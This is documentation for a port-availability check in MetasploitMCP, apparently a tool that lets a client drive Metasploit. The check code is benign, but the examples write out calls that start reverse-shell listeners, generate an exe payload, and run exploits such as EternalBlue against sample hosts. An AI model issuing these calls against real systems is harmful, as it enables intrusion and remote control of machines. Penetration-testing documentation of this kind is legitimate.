# Port Availability Checking

## Overview

MetasploitMCP now validates that LPORT (listener port) is available to bind before attempting to start listeners or run exploits. This provides early, actionable error messages instead of cryptic bind failures from Metasploit Framework.

## Why This Feature Was Added

Previously, when trying to start a listener or run an exploit on a port that was already in use, MetasploitMCP would:
1. Accept the request
2. Pass it to Metasploit Framework
3. Metasploit would attempt to bind the port
4. The bind would fail with a cryptic error
5. The user would have to diagnose the issue

With port availability checking, MetasploitMCP now:
1. Checks if the port is available **before** talking to Metasploit
2. Returns a clear error message immediately if the port is in use
3. Saves time and provides actionable feedback

## How It Works

### Core Function: `check_port_available()`

```python
def check_port_available(port: int, host: str = '0.0.0.0') -> Tuple[bool, str]:
    """
    Check if a port is available to bind to.
    
    Args:
        port: Port number to check
        host: Host/interface to check (default: 0.0.0.0 for all interfaces)
        
    Returns:
        Tuple of (is_available, error_message). If available, error_message is empty.
    """
```

This function:
- Attempts to bind a socket to the specified port and interface
- Uses `SO_REUSEADDR` to allow checking without interfering with existing connections
- Returns `(True, "")` if the port is available
- Returns `(False, "descriptive error message")` if the port is in use

### Integration Points

#### 1. `start_listener()` - Blocks if port unavailable

When starting a standalone listener (for generated payloads or persistent handlers):

```python
result = await start_listener(
    payload_type="windows/meterpreter/reverse_tcp",
    lhost="10.0.0.1",
    lport=4444  # Port is checked before binding
)
```

**Error Example:**
```json
{
    "status": "error",
    "message": "Cannot start listener: Port 4444 is already in use on 0.0.0.0. Please choose a different port or stop the service using this port."
}
```

#### 2. `run_exploit()` - Blocks if LPORT unavailable

When running exploits with reverse payloads:

```python
result = await run_exploit(
    module_name="exploit/unix/ftp/proftpd_modcopy_exec",
    options={"RHOSTS": "192.168.1.100"},
    payload_name="cmd/unix/reverse_perl",
    payload_options={"LHOST": "10.0.0.1", "LPORT": 4444}  # Port is checked
)
```

**Error Example:**
```json
{
    "status": "error",
    "message": "Cannot run exploit: Port 4444 is already in use on 0.0.0.0. Please choose a different port or stop the service using this port."
}
```

#### 3. `generate_payload()` - Warns if port unavailable

When generating payloads (non-blocking, just a warning):

```python
result = await generate_payload(
    payload_type="windows/meterpreter/reverse_tcp",
    format_type="exe",
    options={"LHOST": "10.0.0.1", "LPORT": 4444}  # Port is checked
)
```

**Warning Example (in logs):**
```
WARNING: Port check during payload generation: Port 4444 is already in use on 0.0.0.0.
This payload will need a listener on 0.0.0.0:4444
```

**Note:** Payload generation itself doesn't bind ports - the port is needed later when you start a listener or run the payload. So this is a warning, not a blocking error.

## Bind Address Considerations

The check respects the `ReverseListenerBindAddress` and `ReverseListenerBindPort` options:

```python
# Example: Check port 8080 on localhost only
result = await start_listener(
    payload_type="windows/meterpreter/reverse_tcp",
    lhost="192.168.1.100",  # External IP advertised to target
    lport=4444,
    reverse_listener_bind_address="127.0.0.1",  # Bind only to localhost
    reverse_listener_bind_port=8080  # Use different port for binding
)
# Checks: 127.0.0.1:8080 (not 0.0.0.0:4444)
```

## Common Scenarios

### Scenario 1: Port Already in Use by Another Service

```bash
# Apache is already using port 80
$ sudo netstat -tlnp | grep :80
tcp6  0  0 :::80  :::*  LISTEN  1234/apache2

# Try to start listener on port 80
await start_listener(
    payload_type="cmd/unix/reverse_bash",
    lhost="10.0.0.1",
    lport=80
)

# Result:
{
    "status": "error",
    "message": "Cannot start listener: Port 80 is already in use on 0.0.0.0. Please choose a different port or stop the service using this port."
}
```

**Solution:** Choose a different port or stop Apache.

### Scenario 2: Existing Metasploit Handler

```python
# First listener
await start_listener("windows/meterpreter/reverse_tcp", "10.0.0.1", 4444)
# Success: Job 1 started

# Try to start another listener on the same port
await start_listener("cmd/unix/reverse_bash", "10.0.0.1", 4444)
# Error: Port 4444 already in use
```

**Solution:** Use `list_listeners()` to check active handlers, or use a different port.

### Scenario 3: Exploit After Standalone Listener (Port Conflict)

```python
# Start standalone listener
await start_listener("windows/meterpreter/reverse_tcp", "10.0.0.1", 4444)

# Try to run exploit with same port (will fail!)
await run_exploit(
    module_name="exploit/windows/smb/ms17_010_eternalblue",
    options={"RHOSTS": "192.168.1.10"},
    payload_name="windows/meterpreter/reverse_tcp",
    payload_options={"LHOST": "10.0.0.1", "LPORT": 4444}
)
# Error: Port 4444 already in use
```

**Note:** Remember that `run_exploit()` creates its own handler automatically! Don't call `start_listener()` first.

## Best Practices

1. **Use `list_listeners()` to check active handlers** before starting new ones
2. **Don't call `start_listener()` before `run_exploit()`** - `run_exploit()` creates its own handler
3. **Choose unique ports** for each listener to avoid conflicts
4. **Use port ranges like 4000-5000** for reverse connections (less likely to conflict with services)
5. **Check logs** - port availability warnings in `generate_payload()` help you plan ahead

## Testing

The feature includes comprehensive test coverage:

```bash
# Run port availability tests
poetry run pytest tests/test_tools_integration.py::TestListenerManagement::test_start_listener_port_in_use -v
```

Test coverage includes:
- Port availability check (mocked)
- Port in use scenario
- Invalid port numbers
- Port range validation
- Bind address integration

## Technical Details

### Socket Options

The check uses `SO_REUSEADDR` to allow checking without interfering with TIME_WAIT connections:

```python
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((host, port))
```

### Performance

Port checks are fast (< 1ms typically) and non-blocking:
- Uses standard socket operations
- No network I/O involved
- Cached bind address validation
- Minimal overhead

### Limitations

1. **Race Condition**: There's a small window between checking and actual bind where another process could claim the port. This is inherent to any pre-flight check.

2. **Privileged Ports (1-1024)**: On Unix systems, binding ports < 1024 requires root. The check will fail if you don't have privileges, even if the port is technically available.

3. **IPv6**: Currently only checks IPv4 addresses. IPv6 support may be added in the future.

## Troubleshooting

### "Port X is already in use" but netstat shows nothing

**Cause:** The port might be bound to a specific interface that you're checking.

**Solution:** Try binding to a specific interface with `reverse_listener_bind_address`.

### Port check passes but Metasploit fails to bind

**Cause:** Race condition (another process bound between check and actual bind).

**Solution:** Retry with a different port or use `list_listeners()` to check active handlers.

### Port check fails but I know the port is free

**Cause:** Permissions issue (privileged port) or firewall blocking.

**Solution:** Check permissions with `sudo` or choose a port > 1024.

## Summary

Port availability checking provides:
- ✅ **Early error detection** - fail fast with clear messages
- ✅ **Better UX** - actionable errors instead of cryptic Metasploit failures
- ✅ **Debugging aid** - helps identify port conflicts immediately
- ✅ **Comprehensive coverage** - works in `start_listener()`, `run_exploit()`, and `generate_payload()`

This feature ensures that you know about port conflicts **before** wasting time configuring and running exploits.

